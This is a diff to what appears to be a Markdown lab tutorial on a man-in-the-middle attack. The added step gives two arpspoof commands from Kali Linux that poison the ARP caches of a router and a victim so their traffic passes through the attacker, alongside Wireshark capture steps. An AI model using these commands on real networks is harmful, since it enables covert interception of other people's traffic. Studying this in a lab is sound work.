@@ -53,3 +53,15 @@ sudo sysctl -p
 Open Wireshark and start capturing traffic on the appropriate network interface (e.g., `eth0` or `wlan0`). At this stage, you should see ARP, TCP, TLS packets, etc., without any filters applied.
 ![Wireshark Capture](Screenshot-Mitm-3.png)
 
+### 🔹 Step 3.5: Executing ARP Spoofing
+
+To deceive both the victim and the router, two instances of the `arpspoof` command are executed from Kali Linux:
+
+bash
+```
+sudo arpspoof -i eth1 -t [Router IP] [Victim IP]
+sudo arpspoof -i eth1 -t [Victim IP] [Router IP]
+```
+This causes both devices to send their packets to Kali, believing it is the other party.
+![ARP Spoofing Running](Screenshot-Mitm-4.png)
+
